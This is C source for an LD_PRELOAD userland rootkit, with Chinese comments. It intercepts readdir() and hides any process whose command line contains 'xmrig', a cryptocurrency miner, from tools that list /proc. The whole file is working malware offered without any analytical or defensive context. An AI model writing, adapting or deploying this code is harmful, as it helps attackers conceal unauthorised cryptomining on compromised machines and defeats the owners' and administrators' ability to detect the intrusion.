#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <dlfcn.h>
#include <unistd.h>

// 定義要隱藏的命令字串
#define TARGET_STR "xmrig"

// 原始 readdir 函式的指標
static struct dirent *(*orig_readdir)(DIR *dirp) = NULL;

// 檢查 PID 是否包含目標字串
int is_target_process(const char *name) {
    char path[256], buf[256];
    FILE *f;

    // 只檢查 PID 資料夾 (純數字名稱)
    if (name[0] < '0' || name[0] > '9') return 0;

    snprintf(path, sizeof(path), "/proc/%s/cmdline", name);
    f = fopen(path, "r");
    if (f) {
        size_t len = fread(buf, 1, sizeof(buf) - 1, f);
        buf[len] = '\0';
        fclose(f);
        if (strstr(buf, TARGET_STR)) return 1;
    }
    return 0;
}

// 攔截 readdir
struct dirent *readdir(DIR *dirp) {
    if (!orig_readdir) {
        orig_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *dir;
    while ((dir = orig_readdir(dirp)) != NULL) {
        // 如果這個目錄代表的進程包含目標字串，就跳過它，讀取下一個
        if (is_target_process(dir->d_name)) {
            continue;
        }
        break;
    }
    return dir;
}
